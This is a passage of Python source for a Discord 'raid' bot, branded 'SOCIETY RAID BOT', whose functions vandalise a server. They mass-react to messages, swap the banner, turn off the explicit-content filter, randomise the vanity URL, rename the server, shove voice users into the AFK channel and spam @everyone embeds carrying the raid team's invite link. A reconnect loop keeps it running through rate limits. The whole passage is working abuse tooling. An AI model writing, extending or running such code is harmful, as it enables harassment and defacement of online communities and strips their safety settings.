    for canal in guild.text_channels:
        try:
            async for msg in canal.history(limit=20):
                await msg.add_reaction("💀")
        except:
            pass

async def animated_banner(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://cdn.discordapp.com/attachments/1509314079527796766/1511420199272845403/lv_0_20260602130520.gif") as resp:
                if resp.status == 200:
                    await guild.edit(banner=await resp.read())
    except:
        pass

async def discovery_spam(guild):
    try:
        await guild.edit(discovery_splash=None)
    except:
        pass

async def remove_onboarding(guild):
    pass

async def remove_safety(guild):
    try:
        await guild.edit(explicit_content_filter=discord.ContentFilter.disabled)
    except:
        pass

async def vanity_spam(guild):
    import string
    import random
    try:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        await guild.edit(vanity_code=code)
    except:
        pass

async def fake_boost(guild):
    try:
        await guild.edit(name="🚀 SOCIETY BOOSTED 🚀")
    except:
        pass

async def region_spam(guild):
    regions = [discord.VoiceRegion.brazil, discord.VoiceRegion.us_east, discord.VoiceRegion.europe]
    import random
    try:
        await guild.edit(region=random.choice(regions))
    except:
        pass

async def afk_spam(guild):
    try:
        if guild.afk_channel:
            for member in guild.members:
                if member.voice:
                    await member.move_to(guild.afk_channel)
    except:
        pass

async def system_msg_spam(guild):
    for canal in guild.text_channels:
        try:
            await guild.edit(system_channel=canal)
        except:
            pass

async def spam_messages(canal, banner, art, gifs):
    try:
        await asyncio.sleep(1)
        for i in range(25):
            try:
                embed = discord.Embed(
                    title=f"⚠️ {banner} ⚠️",
                    description=f"**{art}**\n\n**SOCIETY RAID TEAM PASSOU AQUI!**\n\nEntre: https://discord.gg/WJ76QgRA",
                    color=0xFF0000
                )
                embed.set_image(url=gifs[i % len(gifs)])
                embed.set_footer(text="SOCIETY RAID BOT V0.0.0")
                
                await canal.send(content="@everyone", embed=embed)
                await asyncio.sleep(0.4)
            except:
                continue
    except:
        pass

async def main():
    keep_alive()
    while True:
        try:
            await bot.start(TOKEN)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print("ERRO 429: Rate limit do Discord. Aguardando 60 segundos para tentar novamente...")
                await asyncio.sleep(60)
            else:
                print(f"Erro de conexão: {e}")
                await asyncio.sleep(10)
        except Exception as e:
            print(f"Erro inesperado: {e}")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
